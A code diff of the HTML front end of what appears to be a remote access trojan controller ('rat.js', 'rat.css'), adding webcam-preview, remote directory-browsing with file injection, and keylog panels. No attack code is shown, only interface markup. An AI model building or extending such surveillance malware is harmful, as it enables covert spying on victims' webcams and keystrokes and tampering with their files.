@@ -10,7 +10,6 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="msapplication-tap-highlight" content="no">
     <!--Style sheets-->
-    <link rel="stylesheet" type="text/css" href="css/index.css">
     <link rel="stylesheet" type="text/css" href="css/rat.css">
     <!--Scripts-->
 
@@ -20,6 +19,7 @@
 <body>
     <!-- Webcam controls -->
     <div class="view" id="webcam_view">
+        <div class="title">Webcam</div>
         <video autoplay="true" id="webcam_preview"></video>
         <button id="stop_video" class="video_btn">stop video</button>
         <button id="start_video" class="video_btn">start video</button>
@@ -27,11 +27,16 @@
 
     <!-- directory controls -->
     <div class="view" id="directory_view">
+        <div class="title" id="full_path">Directories</div>
+        <div id="back_a_dir" title="go back a directory"></div>
+        <div id="dirbox"></div>
+        <button id="inject_file" class="video_btn">Inject file</button>
     </div>
 
     <!-- Keylog controls -->
     <div class="view" id="keylog_view">
-
+        <div class="title">Keylogg</div>
+        <div id="keybox"></div>
     </div>
 
     <script type="text/javascript" src="js/rat.js"></script>
